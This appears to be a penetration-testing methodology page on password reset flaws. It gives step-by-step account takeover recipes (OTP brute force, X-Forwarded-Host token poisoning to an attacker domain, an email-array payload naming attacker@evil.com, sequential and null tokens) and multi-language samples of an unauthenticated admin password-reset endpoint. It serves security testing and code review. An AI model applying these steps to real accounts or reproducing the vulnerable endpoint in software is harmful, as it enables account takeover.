# Weak Password Reset Functionalities

## Check List

## Methodology

### Black Box

#### Reauthentication For Changing Password Bypass

{% stepper %}
{% step %}
Go to accounts settings
{% endstep %}

{% step %}
Add an email address to the email which we have access to (Remember adding an email doesn't require you to re-enter password but changing password does)
{% endstep %}

{% step %}
Confirm the email address
{% endstep %}

{% step %}
Make it primary email (Even this doesn't require you to re-enter password)
{% endstep %}

{% step %}
Now we can change the password by reseting it through the new ema
{% endstep %}
{% endstepper %}

***

#### The Exploitation Potential Of IDOR In Password Recovery

{% stepper %}
{% step %}
Navigate to the Forgot Password page, typically found at `/forgot-password`, `/reset-password`, `/account/recovery`, or `/login/forgot`, where users initiate password reset requests
{% endstep %}

{% step %}
Enter a registered email address in the email field and submit the form to receive an OTP, capturing the request with Burp Suite to inspect the workflow
{% endstep %}

{% step %}
Locate the email parameter in the POST request body, often used to identify the account for reset and potentially passed unsanitized to the database or logic layer
{% endstep %}

{% step %}
After receiving the OTP for the first account, intercept the final password reset request with Burp Suite, modify the email parameter to a different registered email (`test2@example.com`), and forward it to change the target account’s password
{% endstep %}

{% step %}
Attempt to log in to the target account (`test2@example.com`) with the new password to confirm the IDOR vulnerability allowed unauthorized password reset
{% endstep %}

{% step %}
If login triggers an OTP request (`6-digit code`), note this as the final authentication barrier, then prepare to test for rate limiting weaknesses
{% endstep %}

{% step %}
Use Burp Suite’s Intruder to send multiple POST requests with the login endpoint (`/login`), iterating through `6-digit` OTP combinations (`000000` to `999999`) in the OTP field, monitoring for a 200 OK response
{% endstep %}

{% step %}
If a 200 OK response is received (`after` `~20 minutes`), use the guessed OTP to complete the login, verifying full account compromise due to lack of rate limiting
{% endstep %}

{% step %}
Test email or related parameters (`username, user_id`) on other authentication-related pages like `/login`, `/account/settings`, `/profile/edit`, or `/reset`, as these often handle user identification and may share similar vulnerabilities
{% endstep %}
{% endstepper %}

***

#### Token Leak Via X-Forwarded-Host

{% stepper %}
{% step %}
Enter a registered email in the Forgot Password form and submit it to request a password reset token, intercepting the request with Burp Suite and starting an ngrok server
{% endstep %}

{% step %}
Locate the Host header in the intercepted request and add an `X-Forwarded-Host` header with an ngrok domain to redirect the token link
{% endstep %}

{% step %}
Check the email for the password reset link; if it contains the ngrok domain (`https:/ngrokDomain/action-token?key=xyz`), it confirms the poisoning vulnerability
{% endstep %}

{% step %}
Enter a victim’s email (`victim@example.com`) in the Forgot Password form, intercept the request, and add the `X-Forwarded-Host` header with the ngrok domain to redirect their token
{% endstep %}

{% step %}
Monitor the ngrok server; when the victim clicks the link, capture the token sent to the attacker’s domain, then use it to reset the victim’s password
{% endstep %}

{% step %}
Attempt to log in to the victim’s account with the new password to confirm full account takeover
{% endstep %}
{% endstepper %}

***

#### [Array Of Email Addresses Instead Of a Single Email Address](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover#password-reset-via-email-parameter)

{% stepper %}
{% step %}
Enter a single email in the password reset form and, if the request was in POST form, intercept the request with Burp Suite to change its text
{% endstep %}

{% step %}
Locate the email\_address parameter in the POST request body, originally set as a single string (`{"email_address":"xyz@gmail.com"}`)
{% endstep %}

{% step %}
Modify the email\_address parameter to an array containing a victim’s email (`admin@breadcrumb.com`) and the attacker’s email (`attacker@evil.com`), sending the modified request&#x20;

Change to `{"email_address":["admin@breadcrumb.com","attacker@evil.com"]}`
{% endstep %}

{% step %}
Check the attacker’s email for the password reset link; if received, it confirms the vulnerability allows token delivery to arbitrary addresses
{% endstep %}

{% step %}
Use the received token to access the password reset page (`https://example.com/reset?token=xyz`) and set a new password for the victim’s account
{% endstep %}

{% step %}
Attempt to log in to the victim’s account with the new password to confirm full account takeover
{% endstep %}
{% endstepper %}

***

#### Account Takeover

{% stepper %}
{% step %}
Log in to the target site and go to the forgotten password page
{% endstep %}

{% step %}
Enter your email address so that the link can be sent to you after the process and During the process, use Burp Suite to intercept the request
{% endstep %}

{% step %}
Then, check in the intercepted request whether the parameters in the request Body include an address to the site itself
{% endstep %}

{% step %}
If the request parameter contains a site path, change that parameter to the `attacker's address` or `ngrok` address, etc., and then check your test email to see if clicking on the link redirects you to the attacker's address. If yes, the vulnerability is confirmed
{% endstep %}
{% endstepper %}

***

#### Account Takeover Via Redirect Parameters

{% stepper %}
{% step %}
Enter a registered username or email in the Forgot Password form and submit it to trigger the password reset process, inspecting the page source for AJAX requests with Burp Suite
{% endstep %}

{% step %}
Locate the API endpoint handling password reset tokens, such as `/api/REDACTED/resetPasswordToken/` within the `XMLHttpRequest` responses generated in the background
{% endstep %}

{% step %}
Change the API endpoint request that is specific to resetting passwords to the form `api/v1/resetpassword/<username>` and enter it in the url and check whether the user information and tokens used are present in the response
{% endstep %}

{% step %}
Then, using the information provided, such as the username and token, create a link as follows: `https://www.company.com/#/changePassword/<username>/<token>`
{% endstep %}

{% step %}
Submit the crafted link to reset the target user’s password, then attempt to log in with the new password to confirm account takeover
{% endstep %}
{% endstepper %}

***

#### Account Takeover via Token Parameter

{% stepper %}
{% step %}
Enter your email (`attacker@example.com`) and the admin’s email (`admin@dashboard.example.com)` in the Password Reset form on `/login`, submitting requests consecutively in two different tabs to generate tokens
{% endstep %}

{% step %}
Copy the password reset link for your account (`https://dashboard.example.com/password-reset/form?token=28604`) from the email into a notepad
{% endstep %}

{% step %}
Modify the token in the copied link to the next consecutive number (`change 28604 to 28605`) to target the admin’s token
{% endstep %}

{% step %}
Access the modified link, reset the admin’s password using the form, and note the success to confirm the vulnerability
{% endstep %}

{% step %}
Attempt to log in to the admin account with the new password to verify full account takeover
{% endstep %}
{% endstepper %}

***

#### Open Redirect Account Takeover

{% stepper %}
{% step %}
Enter an email (`my-email@gmail.com`) in the forgotten password form and send a POST request to `/ForgotPassword` and use Burp Suite to look for parameters similar to `returnUrl` in the request body that redirect us to a path. These parameters
{% endstep %}

{% step %}
Locate the `returnUrl` parameter in the `POST` request body (`{"email":"my-email@gmail.com","returnUrl":"/reset/password/:userId/:code"}`) and modify it to an external URL (`https://my-website.com/reset/password/:userId/:code`)
{% endstep %}

{% step %}
Send the request and check for a 500 error, indicating the backend rejects external absolute URLs; then test with a relative path (`//my-website.com/reset/password/:userId/:code`) for a 200 response
{% endstep %}

{% step %}
Identify the open redirect vulnerability in the return parameter (`https://app.target.com/login?return=https://google.com`), then combine it by setting `returnUrl` to `/login?return=https://my-website.com/reset/password/:userId/:code`
{% endstep %}

{% step %}
Check the email for the reset link; if it contains the redirect (`https://app.target.com/login?return=https://my-website.com/reset/password/{userID}/{Random-Code})`, it confirms the vulnerability
{% endstep %}
{% endstepper %}

***

#### Expires On Email Change

{% stepper %}
{% step %}
Enter your email (`old-email@gmail.com`) in the Password Reset form and submit it to generate a reset link, leaving it unused
{% endstep %}

{% step %}
Log in to your account and change the email to a new address (`new-email@gmail.com`), confirming the change, then log out
{% endstep %}

{% step %}
Access the old unused password reset link sent to old-email@gmail.com (`https://example.com/reset?token=xyz`) and submit it to reset the password
{% endstep %}

{% step %}
Set a new password using the reset form and submit it to update the account password
{% endstep %}

{% step %}
Attempt to log in with the new password to confirm the account takeover via the old token
{% endstep %}

{% step %}
Test email or related parameters (`username, user_id`) on other password reset-related endpoints like `/reset`, `/password-reset`, `/account/recovery`, or `/user/reset`, as these often handle token expiration and may share similar flaws
{% endstep %}
{% endstepper %}

***

#### [Token Leak via Referrer](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover#password-reset-feature)

{% stepper %}
{% step %}
Request password reset to your email address
{% endstep %}

{% step %}
Click on the password reset link
{% endstep %}

{% step %}
Don't change password
{% endstep %}

{% step %}
Click any 3rd party websites(Facebook, X)
{% endstep %}

{% step %}
Intercept the request in Burp Suite proxy
{% endstep %}

{% step %}
Check if the referer header is leaking password reset token
{% endstep %}
{% endstepper %}

***

#### 0-Click Full Account Takeover

{% stepper %}
{% step %}
Navigate to the target application and click on the **Forgot Password** feature
{% endstep %}

{% step %}
Enter a valid email address and proceed with the password reset flow until you reach the **New Password** submission step
{% endstep %}

{% step %}
Intercept the HTTP request that is sent when submitting the new password using an intercepting proxy (Burp Suite)
{% endstep %}

{% step %}
Observe that the request contains the following parameters

* User email address
* Password reset token
* New password
{% endstep %}

{% step %}
Modify the intercepted request as follows

* Change the email parameter to the victim’s email addres.
* Set the reset token parameter to `null` or an empty value
{% endstep %}

{% step %}
Send the modified request to the server
{% endstep %}

{% step %}
Observe that the server responds with `HTTP 200 OK` without any validation errors
{% endstep %}

{% step %}
Verify that the password for the victim’s account has been successfully changed
{% endstep %}

{% step %}
Log in using the victim’s email address and the newly set password to confirm full account takeover
{% endstep %}
{% endstepper %}

***

### White Box

#### Unauthenticated Password Change

{% stepper %}
{% step %}
Map the entire system using Burp Suite
{% endstep %}

{% step %}
Find all endpoints and draw them in XMind
{% endstep %}

{% step %}
Decompile the web service
{% endstep %}

{% step %}
Then look for endpoints related to password reset and find the initial processing logic of those endpoints in the code
{% endstep %}

{% step %}
Check whether the password-forgotten function is marked as `AllowAnonymous` or not, like in the code below

**VSCode (Regex Detection)**

{% tabs %}
{% tab title="C#" %}
```regex
(?<Source>AllowAnonymous\s*=\s*true|\[FromBody\])|(?<Sink>ForceResetPassword|ResetPassword|IsSysAdmin|administratorUpdate|PasswordHash)
```
{% endtab %}

{% tab title="Java" %}
```regex
(?<Source>@RequestBody|inputs\.isSysAdmin\s*\()|(?<Sink>forcePasswordReset|administratorGetByUsername|administratorUpdate|setPassword\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(?<Source>\$_(POST|REQUEST)|isSysAdmin)|(?<Sink>resetPassword|updatePassword|password_hash\s*=)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(?<Source>req\.body|isSysAdmin)|(?<Sink>resetPassword|updatePassword|bcrypt|passwordHash)
```
{% endtab %}
{% endtabs %}

**RipGrep (Regex Detection(Linux))**

{% tabs %}
{% tab title="C#" %}
```regex
(AllowAnonymous\s*=\s*true|\[FromBody\])|(ForceResetPassword|ResetPassword|IsSysAdmin|administratorUpdate|PasswordHash)
```
{% endtab %}

{% tab title="Java" %}
```regex
(@RequestBody|inputs\.isSysAdmin\s*\()|(forcePasswordReset|administratorGetByUsername|administratorUpdate|setPassword\s*\()
```
{% endtab %}

{% tab title="PHP" %}
```regex
(\$_(POST|REQUEST)|isSysAdmin)|(resetPassword|updatePassword|password_hash\s*=)
```
{% endtab %}

{% tab title="Node.js" %}
```regex
(req\.body|isSysAdmin)|(resetPassword|updatePassword|bcrypt|passwordHash)
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="C#" %}
```c#
[HttpPost]
[Route("force-reset-password")]
[AuthenticatedService(AllowAnonymous = true)]
[CheckInputForNullFilter]
[ShortDescription("This function will attempt to reset a user's password.")]
[Description("This function will attempt to reset a user's password and should only be called after a user attempts to login and they receive a ChangePasswordNeeded = true.")]
public ActionResult<ResetPasswordResult> ForceResetPassword([FromBody] ForceResetPasswordInputs inputs)
{
	ActionResult<ResetPasswordResult> result;
	try
	{
		ActionResult<ResetPasswordResult> actionResult = base.ReturnResult<ResetPasswordResult>(delegate()
		{
			AuthenticationService instance = AuthenticationService.Instance;
			ForceResetPasswordInputs inputs2 = inputs;
			IPAddress clientIPAddress = this.HttpContext.GetClientIPAddress();
			return instance.ForcePasswordReset(inputs2, (clientIPAddress != null) ? clientIPAddress.ToString() : null);
		});
		base.AuditLogSuccess("force-reset-password");
		result = actionResult;
	}
	//...
}
```
{% endtab %}

{% tab title="Java" %}
```java
@PostMapping("force-reset-password")
@AuthenticatedService(allowAnonymous = true)
@CheckInputForNullFilter
@ShortDescription("This function will attempt to reset a user's password.")
@Description("This function will attempt to reset a user's password and should only be called after a user attempts to login and they receive a ChangePasswordNeeded = true.")
public ResponseEntity<ResetPasswordResult> forceResetPassword(
        @RequestBody ForceResetPasswordInputs inputs,
        HttpServletRequest request) {

    ResponseEntity<ResetPasswordResult> result;
    try {
        ResponseEntity<ResetPasswordResult> actionResult = returnResult(() -> {
            AuthenticationService instance = AuthenticationService.getInstance();
            ForceResetPasswordInputs inputs2 = inputs;
            String clientIPAddress = request.getRemoteAddr();
            return instance.forcePasswordReset(inputs2, clientIPAddress);
        });

        auditLogSuccess("force-reset-password");
        result = actionResult;
    }
    // ...
    return result;
}
```
{% endtab %}

{% tab title="PHP" %}
```php
/
 * @AuthenticatedService(AllowAnonymous=true)
 * @CheckInputForNullFilter
 * @ShortDescription("This function will attempt to reset a user's password.")
 * @Description("This function will attempt to reset a user's password and should only be called after a user attempts to login and they receive a ChangePasswordNeeded = true.")
 */
public function forceResetPassword(Request $request)
{
    try {
        $result = $this->returnResult(function () use ($request) {
            $instance = AuthenticationService::getInstance();
            $inputs = $request->input();
            $clientIPAddress = $request->ip();
            return $instance->forcePasswordReset(
                $inputs,
                $clientIPAddress !== null ? $clientIPAddress : null
            );
        });

        $this->auditLogSuccess("force-reset-password");
        return $result;
    }
    // ...
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
app.post('/force-reset-password', async (req, res) => {
    try {
        const result = await returnResult(async () => {
            const instance = AuthenticationService.getInstance();
            const inputs = req.body;
            const clientIPAddress = req.ip;
            return instance.forcePasswordReset(
                inputs,
                clientIPAddress ? clientIPAddress : null
            );
        });

        auditLogSuccess("force-reset-password");
        res.send(result);
    }
    // ...
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
During the review, check whether it is possible to change the passwords of high-privilege users, like in the code below

{% tabs %}
{% tab title="C#" %}
```c#
public new ResetPasswordResult ForcePasswordReset(ForceResetPasswordInputs inputs, string hostname)
{
	ResetPasswordResult resetPasswordResult = new ResetPasswordResult();
	try
	{
		resetPasswordResult.DebugInfo = "check1" + Environment.NewLine;
		//...
		if (inputs.IsSysAdmin)
		{
			ResetPasswordResult resetPasswordResult4 = resetPasswordResult;
		}
		else
		{
			ResetPasswordResult resetPasswordResult9 = resetPasswordResult;
			//...
		}
		//...
	}
```
{% endtab %}

{% tab title="Java" %}
```java
public ResetPasswordResult forcePasswordReset(ForceResetPasswordInputs inputs, String hostname) {
    ResetPasswordResult resetPasswordResult = new ResetPasswordResult();
    try {
        resetPasswordResult.setDebugInfo("check1" + System.lineSeparator());
        //...
        if (inputs.isSysAdmin()) {
            ResetPasswordResult resetPasswordResult4 = resetPasswordResult;
        } else {
            ResetPasswordResult resetPasswordResult9 = resetPasswordResult;
            //...
        }
        //...
    }
    //...
    return resetPasswordResult;
}

```
{% endtab %}

{% tab title="PHP" %}
```php
public function forcePasswordReset($inputs, $hostname)
{
    $resetPasswordResult = new ResetPasswordResult();
    try {
        $resetPasswordResult->DebugInfo = "check1" . PHP_EOL;
        //...
        if ($inputs->IsSysAdmin) {
            $resetPasswordResult4 = $resetPasswordResult;
        } else {
            $resetPasswordResult9 = $resetPasswordResult;
            //...
        }
        //...
    }
    //...
    return $resetPasswordResult;
}
```
{% endtab %}

{% tab title="Node.js" %}
```js
function forcePasswordReset(inputs, hostname) {
    const resetPasswordResult = new ResetPasswordResult();
    try {
        resetPasswordResult.debugInfo = "check1\n";
        //...
        if (inputs.isSysAdmin) {
            const resetPasswordResult4 = resetPasswordResult;
        } else {
            const resetPasswordResult9 = resetPasswordResult;
            //...
        }
        //...
    }
    //...
    return resetPasswordResult;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
Then check whether admin account validation is performed during the password-forgotten process or not. If there is no validation, it can be abused, like in the code below

{% tabs %}
{% tab title="C#" %}
```c#
public new ResetPasswordResult ForcePasswordReset(ForceResetPasswordInputs inputs, string hostname)
{
	ResetPasswordResult resetPasswordResult = new ResetPasswordResult();
	try
	{
		//...
		if (inputs.IsSysAdmin)
		{
			ResetPasswordResult resetPasswordResult4 = resetPasswordResult;
			resetPasswordResult4.DebugInfo = resetPasswordResult4.DebugInfo + "check4.2" + Environment.NewLine;
			db_system_administrator_readonly db_system_administrator_readonly = SystemRepository.Instance.AdministratorGetByUsername(inputs.Username); // [1]
			if (db_system_administrator_readonly == null)
			{
				resetPasswordResult.Success = false;
				resetPasswordResult.Message = "USER_NOT_FOUND";
				resetPasswordResult.ResultCode = HttpStatusCode.BadRequest;
				return resetPasswordResult;
			}
			PasswordStrength.FailedRequirementWithVariable requirementCodes = PasswordStrength.GetRequirementCodes(db_system_administrator_readonly, inputs.NewPassword, false);
			ResetPasswordResult resetPasswordResult5 = resetPasswordResult;
			resetPasswordResult5.DebugInfo = resetPasswordResult5.DebugInfo + "check5.2" + Environment.NewLine;
			if (requirementCodes != null)
			{
				resetPasswordResult.Success = false;
				resetPasswordResult.Username = inputs.Username;
				resetPasswordResult.Message = requirementCodes.Item1;
				resetPasswordResult.ErrorCode = requirementCodes.Item1;
				resetPasswordResult.ErrorData = requirementCodes.Item2;
				resetPasswordResult.ResultCode = HttpStatusCode.BadRequest;
				PasswordBruteForceDetector.Instance.ResetSource(hostname);
				return resetPasswordResult;
			}
			Dictionary<string, DateTime> dictionary = db_system_administrator_readonly.password_history_hashed_readonly.ToDictionary<string, DateTime>();
			dictionary.Add(db_system_administrator_readonly.password_hash, DateTime.UtcNow);
			db_system_administrator item = new db_system_administrator
			{
				guid = db_system_administrator_readonly.guid,
				Password = inputs.NewPassword,
				password_history_hashed = dictionary
			}; 
			ResetPasswordResult resetPasswordResult6 = resetPasswordResult;
			resetPasswordResult6.DebugInfo = resetPasswordResult6.DebugInfo + "check6.2" + Environment.NewLine;
			try
			{
				SystemRepository.Instance.AdministratorUpdate(item, new bool?(false), new db_system_administrator.Columns[]
				{
					db_system_administrator.Columns.password_hash,
					db_system_administrator.Columns.password_history_hashed
				});
			}
			catch (Exception ex)
			{
				resetPasswordResult.Success = false;
				resetPasswordResult.ResultCode = HttpStatusCode.BadRequest;
				resetPasswordResult.Message = ex.Message;
				return resetPasswordResult;
			}
			ResetPasswordResult resetPasswordResult7 = resetPasswordResult;
			resetPasswordResult7.DebugInfo = resetPasswordResult7.DebugInfo + "check7.2" + Environment.NewLine;
			PasswordBruteForceDetector.Instance.ResetSource(hostname);
			ResetPasswordResult resetPasswordResult8 = resetPasswordResult;
			resetPasswordResult8.DebugInfo = resetPasswordResult8.DebugInfo + "check8.2" + Environment.NewLine;
		}
		else
		{
			ResetPasswordResult resetPasswordResult9 = resetPasswordResult; 
			//...
		}
		//...
	}
	//...
}
```
{% endtab %}

{% tab title="Java" %}
```java
public ResetPasswordResult forcePasswordReset(ForceResetPasswordInputs inputs, String hostname) {
    ResetPasswordResult resetPasswordResult = new ResetPasswordResult();
    try {
        //...
        if (inputs.isSysAdmin()) {
            ResetPasswordResult resetPasswordResult4 = resetPasswordResult;
            resetPasswordResult4.setDebugInfo(
                resetPasswordResult4.getDebugInfo() + "check4.2" + System.lineSeparator()
            );

            db_system_administrator_readonly adminReadonly =
                SystemRepository.getInstance().administratorGetByUsername(inputs.getUsername()); // [1]

            if (adminReadonly == null) {
                resetPasswordResult.setSuccess(false);
                resetPasswordResult.setMessage("USER_NOT_FOUND");
                resetPasswordResult.setResultCode(HttpStatus.BAD_REQUEST);
                return resetPasswordResult;
            }

            PasswordStrength.FailedRequirementWithVariable requirementCodes =
                PasswordStrength.getRequirementCodes(
                    adminReadonly,
                    inputs.getNewPassword(),
                    false
                );

            ResetPasswordResult resetPasswordResult5 = resetPasswordResult;
            resetPasswordResult5.setDebugInfo(
                resetPasswordResult5.getDebugInfo() + "check5.2" + System.lineSeparator()
            );

            if (requirementCodes != null) {
                resetPasswordResult.setSuccess(false);
                resetPasswordResult.setUsername(inputs.getUsername());
                resetPasswordResult.setMessage(requirementCodes.getItem1());
                resetPasswordResult.setErrorCode(requirementCodes.getItem1());
                resetPasswordResult.setErrorData(requirementCodes.getItem2());
                resetPasswordResult.setResultCode(HttpStatus.BAD_REQUEST);
                PasswordBruteForceDetector.getInstance().resetSource(hostname);
                return resetPasswordResult;
            }

            Map<String, LocalDateTime> dictionary =
                new HashMap<>(adminReadonly.getPasswordHistoryHashedReadonly());

            dictionary.put(adminReadonly.getPasswordHash(), LocalDateTime.now(ZoneOffset.UTC));

            db_system_administrator item = new db_system_administrator();
            item.setGuid(adminReadonly.getGuid());
            item.setPassword(inputs.getNewPassword());
            item.setPasswordHistoryHashed(dictionary);

            ResetPasswordResult resetPasswordResult6 = resetPasswordResult;
            resetPasswordResult6.setDebugInfo(
                resetPasswordResult6.getDebugInfo() + "check6.2" + System.lineSeparator()
            );

            try {
                SystemRepository.getInstance().administratorUpdate(
                    item,
                    Boolean.FALSE,
                    new db_system_administrator.Columns[] {
                        db_system_administrator.Columns.password_hash,
                        db_system_administrator.Columns.password_history_hashed
                    }
                );
            } catch (Exception ex) {
                resetPasswordResult.setSuccess(false);
                resetPasswordResult.setResultCode(HttpStatus.BAD_REQUEST);
                resetPasswordResult.setMessage(ex.getMessage());
                return resetPasswordResult;
            }

            ResetPasswordResult resetPasswordResult7 = resetPasswordResult;
            resetPasswordResult7.setDebugInfo(
                resetPasswordResult7.getDebugInfo() + "check7.2" + System.lineSeparator()
            );

            PasswordBruteForceDetector.getInstance().resetSource(hostname);

            ResetPasswordResult resetPasswordResult8 = resetPasswordResult;
            resetPasswordResult8.setDebugInfo(
                resetPasswordResult8.getDebugInfo() + "check8.2" + System.lineSeparator()
            );
        } else {
            ResetPasswordResult resetPasswordResult9 = resetPasswordResult;
            //...
        }
        //...
    }
    //...
    return resetPasswordResult;
}

```
{% endtab %}

{% tab title="PHP" %}
```php
public function forcePasswordReset($inputs, $hostname)
{
    $resetPasswordResult = new ResetPasswordResult();
    try {
        //...
        if ($inputs->IsSysAdmin) {
            $resetPasswordResult4 = $resetPasswordResult;
            $resetPasswordResult4->DebugInfo .= "check4.2" . PHP_EOL;

            $adminReadonly =
                SystemRepository::getInstance()
                    ->administratorGetByUsername($inputs->Username); // [1]

            if ($adminReadonly === null) {
                $resetPasswordResult->Success = false;
                $resetPasswordResult->Message = "USER_NOT_FOUND";
                $resetPasswordResult->ResultCode = 400;
                return $resetPasswordResult;
            }

            $requirementCodes =
                PasswordStrength::getRequirementCodes(
                    $adminReadonly,
                    $inputs->NewPassword,
                    false
                );

            $resetPasswordResult5 = $resetPasswordResult;
            $resetPasswordResult5->DebugInfo .= "check5.2" . PHP_EOL;

            if ($requirementCodes !== null) {
                $resetPasswordResult->Success = false;
                $resetPasswordResult->Username = $inputs->Username;
                $resetPasswordResult->Message = $requirementCodes[0];
                $resetPasswordResult->ErrorCode = $requirementCodes[0];
                $resetPasswordResult->ErrorData = $requirementCodes[1];
                $resetPasswordResult->ResultCode = 400;
                PasswordBruteForceDetector::getInstance()->resetSource($hostname);
                return $resetPasswordResult;
            }

            $dictionary = $adminReadonly->password_history_hashed_readonly;
            $dictionary[$adminReadonly->password_hash] = gmdate('c');

            $item = new db_system_administrator();
            $item->guid = $adminReadonly->guid;
            $item->Password = $inputs->NewPassword;
            $item->password_history_hashed = $dictionary;

            $resetPasswordResult6 = $resetPasswordResult;
            $resetPasswordResult6->DebugInfo .= "check6.2" . PHP_EOL;

            try {
                SystemRepository::getInstance()->administratorUpdate(
                    $item,
                    false,
                    [
                        db_system_administrator::Columns_password_hash,
                        db_system_administrator::Columns_password_history_hashed
                    ]
                );
            } catch (Exception $ex) {
                $resetPasswordResult->Success = false;
                $resetPasswordResult->ResultCode = 400;
                $resetPasswordResult->Message = $ex->getMessage();
                return $resetPasswordResult;
            }

            $resetPasswordResult7 = $resetPasswordResult;
            $resetPasswordResult7->DebugInfo .= "check7.2" . PHP_EOL;

            PasswordBruteForceDetector::getInstance()->resetSource($hostname);

            $resetPasswordResult8 = $resetPasswordResult;
            $resetPasswordResult8->DebugInfo .= "check8.2" . PHP_EOL;
        } else {
            $resetPasswordResult9 = $resetPasswordResult;
            //...
        }
        //...
    }
    //...
    return $resetPasswordResult;
}

```
{% endtab %}

{% tab title="Node.js" %}
```js
function forcePasswordReset(inputs, hostname) {
    const resetPasswordResult = new ResetPasswordResult();
    try {
        //...
        if (inputs.isSysAdmin) {
            const resetPasswordResult4 = resetPasswordResult;
            resetPasswordResult4.debugInfo += "check4.2\n";

            const adminReadonly =
                SystemRepository.getInstance()
                    .administratorGetByUsername(inputs.username); // [1]

            if (adminReadonly === null) {
                resetPasswordResult.success = false;
                resetPasswordResult.message = "USER_NOT_FOUND";
                resetPasswordResult.resultCode = 400;
                return resetPasswordResult;
            }

            const requirementCodes =
                PasswordStrength.getRequirementCodes(
                    adminReadonly,
                    inputs.newPassword,
                    false
                );

            const resetPasswordResult5 = resetPasswordResult;
            resetPasswordResult5.debugInfo += "check5.2\n";

            if (requirementCodes !== null) {
                resetPasswordResult.success = false;
                resetPasswordResult.username = inputs.username;
                resetPasswordResult.message = requirementCodes[0];
                resetPasswordResult.errorCode = requirementCodes[0];
                resetPasswordResult.errorData = requirementCodes[1];
                resetPasswordResult.resultCode = 400;
                PasswordBruteForceDetector.getInstance().resetSource(hostname);
                return resetPasswordResult;
            }

            const dictionary = {
                ...adminReadonly.password_history_hashed_readonly
            };
            dictionary[adminReadonly.password_hash] = new Date().toISOString();

            const item = {
                guid: adminReadonly.guid,
                Password: inputs.newPassword,
                password_history_hashed: dictionary
            };

            const resetPasswordResult6 = resetPasswordResult;
            resetPasswordResult6.debugInfo += "check6.2\n";

            try {
                SystemRepository.getInstance().administratorUpdate(
                    item,
                    false,
                    [
                        "password_hash",
                        "password_history_hashed"
                    ]
                );
            } catch (ex) {
                resetPasswordResult.success = false;
                resetPasswordResult.resultCode = 400;
                resetPasswordResult.message = ex.message;
                return resetPasswordResult;
            }

            const resetPasswordResult7 = resetPasswordResult;
            resetPasswordResult7.debugInfo += "check7.2\n";

            PasswordBruteForceDetector.getInstance().resetSource(hostname);

            const resetPasswordResult8 = resetPasswordResult;
            resetPasswordResult8.debugInfo += "check8.2\n";
        } else {
            const resetPasswordResult9 = resetPasswordResult;
            //...
        }
        //...
    }
    //...
    return resetPasswordResult;
}
```
{% endtab %}
{% endtabs %}
{% endstep %}
{% endstepper %}

## Cheat Sheet
